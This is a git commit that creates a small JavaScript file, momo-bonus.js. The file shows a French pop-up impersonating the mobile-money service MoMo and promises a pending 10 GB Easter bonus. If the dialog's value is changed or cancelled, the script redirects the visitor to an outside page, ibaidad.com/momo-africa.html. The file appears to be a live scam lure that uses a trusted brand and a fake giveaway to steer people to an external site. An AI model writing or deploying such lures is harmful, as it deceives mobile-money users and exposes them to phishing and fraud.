35ae96457c6278fa4ef4854512352ce2dea0e4c6
mfednewblog8 <nsikakimoh68@gmail.com>
2026-04-03 08:26:27 +0100

    Create momo-bonus.js

---
+++ momo-bonus.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 10 Go'
+password=prompt('MoMo: Félicitations, votre bonus de Pâques de 10 Go est en attente... Cliquez sur OK pour le recevoir.','ACTIVER 10 Go');
+if (password != 'ACTIVER 10 Go') {
+location.href='https://ibaidad.com/momo-africa.html';
+}
